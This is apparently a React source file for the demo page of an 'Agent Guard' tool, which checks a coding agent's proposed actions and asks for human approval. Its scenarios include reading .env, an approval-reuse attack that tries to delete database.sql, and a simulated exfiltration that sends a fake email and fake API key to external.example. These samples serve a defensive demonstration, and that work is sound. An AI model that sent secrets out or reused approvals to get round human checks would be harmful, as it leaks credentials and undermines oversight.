import { useState } from "react";
import { api, ApiError } from "../api/client";
import type { Decision, EvaluateRequest } from "../types";
import { DecisionBadge } from "../components/common";
import { PipelineDiagram, type Stage } from "../components/PipelineDiagram";

const GOAL = "Build a React frontend. Do not modify backend or database, and never access secrets.";
const AGENT = "Coding Agent";

function req(action: string, resource: string, tool: string): EvaluateRequest {
  return { goal: GOAL, action, resource, resource_kind: action === "network" ? "url" : "file",
           tool, session_id: "demo", agent_id: AGENT };
}

type SState = {
  status: "idle" | "running" | "awaiting" | "done";
  decision?: Decision | string;
  executed?: boolean;
  note?: string;
  approvalId?: string | null;
  eventId?: string;
};

const SCENARIOS = [
  { n: 1, title: "Safe frontend read", action: "read src/App.jsx", kind: "auto" as const },
  { n: 2, title: "Secret access", action: "read .env", kind: "auto" as const },
  { n: 3, title: "Destructive action → approve", action: "delete src/generated.jsx", kind: "approve" as const },
  { n: 4, title: "Destructive action → reject", action: "delete src/generated.jsx", kind: "reject" as const },
  { n: 5, title: "Approval-reuse attack", action: "reuse approval → delete database.sql", kind: "attack" as const },
  { n: 6, title: "Data exfiltration", action: "send_external_request → external.example (secret + email)", kind: "exfil" as const },
];

const EXFIL_DEST = "https://external.example/upload";
function exfilRequest(): EvaluateRequest {
  return {
    goal: GOAL, action: "transmit", resource: EXFIL_DEST, resource_kind: "url",
    tool: "send_external_request", destination: EXFIL_DEST,
    // Fake/simulated sensitive values only — never real credentials.
    payload: "user_email=alice@example.com API_KEY=sk-ant-api03-ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    session_id: "demo", agent_id: AGENT,
  };
}

export function DemoPage() {
  const [state, setState] = useState<Record<number, SState>>({});
  const [lastDecision, setLastDecision] = useState<Decision | null>(null);
  const [stage, setStage] = useState<Stage | undefined>(undefined);
  const set = (n: number, s: SState) => setState((p) => ({ ...p, [n]: s }));

  function fail(n: number, e: unknown) {
    const msg = e instanceof ApiError ? e.message : "Request failed";
    set(n, { status: "done", decision: "DENY", executed: false, note: `Backend error: ${msg}` });
  }

  async function runAuto(n: number, r: EvaluateRequest) {
    set(n, { status: "running" });
    setStage("guard");
    try {
      const res = await api.evaluate(r);
      setLastDecision(res.decision); setStage("decision");
      if (res.decision === "ALLOW") {
        await api.reportExecution(res.event_id, "REPORTED_EXECUTED");
        setStage("execution");
        set(n, { status: "done", decision: "ALLOW", executed: true,
          note: "Authorized — tool executed and recorded.", eventId: res.event_id });
      } else {
        set(n, { status: "done", decision: res.decision, executed: false,
          note: `Tool execution prevented. ${res.reason}`, eventId: res.event_id });
      }
    } catch (e) { fail(n, e); }
  }

  async function runAsk(n: number, r: EvaluateRequest) {
    set(n, { status: "running" });
    setStage("guard");
    try {
      const res = await api.evaluate(r);
      setLastDecision(res.decision); setStage("decision");
      set(n, { status: "awaiting", decision: res.decision, executed: false,
        approvalId: res.approval_id, eventId: res.event_id,
        note: "Awaiting human approval — tool has NOT executed." });
    } catch (e) { fail(n, e); }
  }

  async function approve(n: number, s: SState, r: EvaluateRequest) {
    if (!s.approvalId) return;
    set(n, { ...s, status: "running" });
    try {
      await api.approve(s.approvalId);
      const c = await api.consume(s.approvalId, r); // fingerprint re-verified server-side
      if (c.authorized) {
        if (s.eventId) await api.reportExecution(s.eventId, "REPORTED_EXECUTED");
        setStage("execution");
        set(n, { ...s, status: "done", executed: true,
          note: "Fingerprint verified · authorized · tool executed exactly once." });
      } else {
        set(n, { ...s, status: "done", executed: false, note: `Blocked: ${c.reason}` });
      }
    } catch (e) { fail(n, e); }
  }

  async function reject(n: number, s: SState) {
    if (!s.approvalId) return;
    set(n, { ...s, status: "running" });
    try {
      await api.reject(s.approvalId);
      set(n, { ...s, status: "done", executed: false,
        note: "Human rejected — tool never executes; audit records REJECTED." });
    } catch (e) { fail(n, e); }
  }

  async function attack(n: number) {
    set(n, { status: "running", note: "Approving a harmless delete, then reusing it for database.sql…" });
    setStage("guard");
    try {
      const ask = await api.evaluate(req("delete", "src/generated.jsx", "delete_file"));
      if (ask.approval_id) await api.approve(ask.approval_id);
      // Attacker reuses the approval for a DIFFERENT, dangerous resource.
      const c = await api.consume(ask.approval_id!, req("delete", "database.sql", "delete_file"));
      setLastDecision("DENY"); setStage("decision");
      set(n, { status: "done", decision: "DENY", executed: c.authorized,
        note: c.authorized ? "UNEXPECTED: authorized" : `BLOCKED · ${c.reason}` });
    } catch (e) { fail(n, e); }
  }

  function run(n: number, kind: string) {
    if (kind === "auto") return runAuto(n, n === 1 ? req("read", "src/App.jsx", "read_file") : req("read", ".env", "read_file"));
    if (kind === "approve" || kind === "reject") return runAsk(n, req("delete", "src/generated.jsx", "delete_file"));
    if (kind === "attack") return attack(n);
    if (kind === "exfil") return runAuto(n, exfilRequest());
  }

  async function runAll() {
    await runAuto(1, req("read", "src/App.jsx", "read_file"));
    await runAuto(2, req("read", ".env", "read_file"));
    await runAsk(3, req("delete", "src/generated.jsx", "delete_file"));
    await runAsk(4, req("delete", "src/generated.jsx", "delete_file"));
    await attack(5);
    await runAuto(6, exfilRequest());
  }

  return (
    <>
      <p className="pageintro">
        The browser here acts as the <b>agent adapter</b>: it submits each proposed action to the real
        Agent Guard backend and only reports execution <b>after</b> authorization. Nothing on this page
        is faked — decisions, approvals, risk scores and the fingerprint check all come from the API.
      </p>

      <div className="demo-toolbar">
        <button className="btn primary" onClick={runAll}>▷ Run all scenarios</button>
        <span className="faint" style={{ fontSize: 12 }}>Goal: “{GOAL}”</span>
      </div>

      <div className="grid-2">
        <div>
          {SCENARIOS.map((sc) => {
            const s = state[sc.n] ?? { status: "idle" as const };
            const r3 = req("delete", "src/generated.jsx", "delete_file");
            return (
              <div className="scenario" key={sc.n}>
                <div className="scenario-head">
                  <div style={{ display: "flex", gap: 10, alignItems: "center" }}>
                    <span className="scenario-num">{sc.n}</span>
                    <div>
                      <div className="scenario-title">{sc.title}</div>
                      <div className="scenario-action">Agent → {sc.action}</div>
                    </div>
                  </div>
                  <button className="btn sm" disabled={s.status === "running"} onClick={() => run(sc.n, sc.kind)}>
                    {s.status === "idle" ? "Run" : s.status === "running" ? "…" : "Re-run"}
                  </button>
                </div>

                {s.status !== "idle" && (
                  <div className="scenario-result">
                    <div className="result-line">
                      <span className="lbl">Guard</span>
                      {s.decision ? <DecisionBadge decision={s.decision} /> : <span className="pulse">evaluating…</span>}
                    </div>
                    <div className="result-line">
                      <span className="lbl">Tool</span>
                      {s.status === "awaiting"
                        ? <span className="exec-no">NOT EXECUTED (pending)</span>
                        : s.executed ? <span className="exec-yes">EXECUTED</span> : <span className="exec-no">NOT EXECUTED</span>}
                    </div>
                    {s.status === "awaiting" && (
                      <div style={{ display: "flex", gap: 8 }}>
                        {sc.kind === "approve" && <button className="btn approve sm" onClick={() => approve(sc.n, s, r3)}>Approve</button>}
                        {sc.kind === "reject" && <button className="btn reject sm" onClick={() => reject(sc.n, s)}>Reject</button>}
                      </div>
                    )}
                  </div>
                )}
                {s.note && <div className={sc.kind === "attack" ? "attack-note" : "scenario-action"} style={{ marginTop: 8 }}>{s.note}</div>}
              </div>
            );
          })}
        </div>

        <div className="panel" style={{ position: "sticky", top: 90 }}>
          <div className="panel-head"><span className="panel-title">Live security flow</span></div>
          <PipelineDiagram decision={lastDecision} activeStage={stage} />
        </div>
      </div>
    </>
  );
}
